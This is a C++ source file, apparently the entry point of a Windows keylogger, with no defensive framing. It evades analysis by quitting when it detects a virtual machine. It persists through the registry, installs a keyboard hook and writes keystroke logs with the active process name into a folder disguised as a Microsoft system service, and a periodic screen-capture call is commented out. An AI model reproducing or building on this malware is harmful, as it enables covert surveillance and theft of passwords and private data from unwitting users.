#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

int main() {
#ifdef DEBUG_BUILD
  std::vector<std::filesystem::path>
	  path = Stream::GetAllFilesInFolder(Stream::GetPath(R"(\Microsoft\SystemService\)"));
  std::string final = Convert::GetFinalFile(path[0].u8string());
  DEBN(final)
#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
    DEB("Virtual Machine")
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }
  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  std::string path = Stream::GetPath("\\Microsoft\\SystemService");

  Stream::MakeDir(path);
  Stream::MakeFile();

  Stream::WriteLog("[*] BOOT [*]",
				   KeyHook::activeProcess,
				   false);
  /*Screen::CaptureScreen(path,
						"winpst",
						true,
						60000);
						*/

  KeyHook::HandleMessage(true);
#endif // DEBUG_BUILD
  return 0;
}


